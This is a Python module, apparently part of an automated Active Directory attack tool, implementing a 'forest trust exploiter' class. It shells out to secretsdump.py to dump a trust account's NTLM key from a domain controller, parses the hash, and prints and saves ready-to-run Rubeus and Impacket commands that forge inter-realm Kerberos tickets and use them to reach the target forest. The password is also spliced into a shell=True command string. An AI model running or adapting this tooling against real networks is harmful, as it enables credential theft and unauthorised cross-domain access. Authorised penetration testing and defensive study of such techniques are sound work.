"""
Forest Trust Exploiter
Exploit forest trust relationships via trust key extraction
"""

import subprocess
import shutil
from typing import Optional, List
from pathlib import Path
from datetime import datetime

from .base import BaseExploiter
from ..models import (
    ExploitPath,
    ExploitAttempt,
    ExploitMethod,
    ExploitResult,
)
from ..utils import parse_secretsdump_keys, extract_ntlm_from_line


class ForestTrustExploiter(BaseExploiter):
    """
    Exploit forest trust relationships
    Primary method: Extract trust key and forge inter-realm TGTs
    """

    def __init__(self, output_dir: str = "auto_trust_exploit", verbose: bool = True):
        """Initialize forest trust exploiter"""
        super().__init__(output_dir, verbose)

    def is_available(self) -> bool:
        """Check if secretsdump.py is available"""
        return shutil.which("secretsdump.py") is not None

    def generate_commands(
            self,
            path: ExploitPath,
            username: str,
            dc_ip: str
    ) -> List[str]:
        """
        Generate forest trust exploitation commands
        """
        trust_account = path.trust_info.trust_account if path.trust_info else f"{path.target_domain.split('.')[0].upper()}$"

        commands = [
            "# Forest Trust Exploitation",
            "# Extract trust key and forge inter-realm TGT",
            "",
            f"# Source: {path.source_domain}",
            f"# Target: {path.target_domain}",
            f"# Trust account: {trust_account}",
            "",
            "# Step 1: Extract trust key",
            f"secretsdump.py {path.source_domain}/{username}:'PASSWORD'@{dc_ip} -just-dc-user '{trust_account}'",
            "",
            "# Step 2: Get domain SID",
            f"lookupsid.py {path.source_domain}/{username}:'PASSWORD'@{dc_ip}",
            "",
            "# Step 3a: Forge inter-realm TGT with Rubeus (Windows)",
            f"Rubeus.exe asktgs /user:{username} /domain:{path.source_domain} \\",
            f"  /service:krbtgt/{path.target_domain} /rc4:TRUST_KEY_HASH /ptt",
            "",
            "# Step 3b: Forge inter-realm TGT with Impacket (Linux)",
            f"ticketer.py -nthash TRUST_KEY_HASH -domain-sid SOURCE_DOMAIN_SID \\",
            f"  -domain {path.source_domain} -spn krbtgt/{path.target_domain} {username}",
            "",
            "# Step 4: Use the ticket",
            f"export KRB5CCNAME={username}.ccache",
            f"smbclient.py -k -no-pass {path.target_domain}/{username}@dc.{path.target_domain}",
            "",
            "# NOTE: SID filtering is usually enabled on forest trusts",
            "# You'll have access as a user from trusted forest, not admin",
            "# Check for SID filtering bypass opportunities",
        ]

        return commands

    def exploit(
            self,
            path: ExploitPath,
            username: str,
            password: str,
            dc_ip: str
    ) -> ExploitAttempt:
        """
        Execute forest trust exploitation
        """
        self.log(f"Exploiting forest trust...")
        self.log(f"Source: {path.source_domain}")
        self.log(f"Target: {path.target_domain}")

        trust_account = path.trust_info.trust_account if path.trust_info else f"{path.target_domain.split('.')[0].upper()}$"

        attempt = ExploitAttempt(
            source_domain=path.source_domain,
            target_domain=path.target_domain,
            method=ExploitMethod.TRUST_KEY,
            result=ExploitResult.FAILED,
            started_at=datetime.now(),
        )

        if not self.is_available():
            self.log("secretsdump.py not available", "error")
            attempt.result = ExploitResult.COMMANDS_GENERATED

            commands = self.generate_commands(path, username, dc_ip)
            cmd_file = self.save_commands(commands, path)
            attempt.commands_generated = commands
            attempt.output_file = str(cmd_file)
            attempt.completed_at = datetime.now()

            return attempt

        # Extract trust key
        self.log(f"Extracting trust key for {trust_account}...")

        cmd = f"secretsdump.py {path.source_domain}/{username}:'{password}'@{dc_ip} -just-dc-user '{trust_account}'"

        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=self.timeout
            )

            # Save output
            output_file = self.output_dir / f"trustkey_{path.source_domain}_to_{path.target_domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            output_file.write_text(result.stdout + "\n\nSTDERR:\n" + result.stderr)
            attempt.output_file = str(output_file)

            if result.returncode == 0 and result.stdout:
                # Parse trust key
                trust_key = None

                for line in result.stdout.split('\n'):
                    if trust_account.upper() in line.upper() and ':::' in line:
                        trust_key = extract_ntlm_from_line(line)
                        break

                if trust_key:
                    self.log(f"Trust key extracted: {trust_key}", "success")

                    attempt.result = ExploitResult.KEY_EXTRACTED
                    attempt.trust_key_extracted = trust_key

                    # Print exploitation instructions
                    self._print_exploitation_guide(path, trust_key, username)

                    # Generate full commands
                    commands = self.generate_commands(path, username, dc_ip)
                    cmd_file = self.save_commands(commands, path)
                    attempt.commands_generated = commands
                else:
                    self.log("Could not extract trust key from output", "error")
                    attempt.error_message = "Trust key not found in output"
            else:
                self.log(f"secretsdump failed: {result.stderr}", "error")
                attempt.error_message = result.stderr

        except subprocess.TimeoutExpired:
            self.log("secretsdump timeout", "error")
            attempt.error_message = "Timeout"
            attempt.result = ExploitResult.ERROR
        except Exception as e:
            self.log(f"Error: {e}", "error")
            attempt.error_message = str(e)
            attempt.result = ExploitResult.ERROR

        attempt.completed_at = datetime.now()
        return attempt

    def _print_exploitation_guide(
            self,
            path: ExploitPath,
            trust_key: str,
            username: str
    ) -> None:
        """Print quick exploitation guide"""
        print(f"\n" + "=" * 60)
        print("TRUST KEY EXTRACTED - NEXT STEPS")
        print("=" * 60)

        print(f"\n[+] Trust Key: {trust_key}")

        print(f"\n[*] Option 1: Rubeus (Windows)")
        print(f"    Rubeus.exe asktgs /user:{username} /domain:{path.source_domain} \\")
        print(f"      /service:krbtgt/{path.target_domain} /rc4:{trust_key} /ptt")

        print(f"\n[*] Option 2: Impacket (Linux)")
        print(f"    ticketer.py -nthash {trust_key} -domain-sid SID \\")
        print(f"      -domain {path.source_domain} -spn krbtgt/{path.target_domain} {username}")

        print(f"\n[!] Note: SID filtering likely enabled on forest trusts")
        print(f"    You'll access {path.target_domain} as authenticated user, not admin")

    def check_sid_filtering(
            self,
            path: ExploitPath,
            username: str,
            password: str
    ) -> bool:
        """
        Check if SID filtering is enabled on trust
        Returns True if SID filtering is DISABLED (exploitable)
        """
        self.log(f"Checking SID filtering status...")

        # This would require additional enumeration
        # For now, assume SID filtering is enabled (default)

        self.log("SID filtering check requires manual verification:", "warning")
        self.log(f"  netdom trust {path.source_domain} /domain:{path.target_domain} /quarantine")

        return False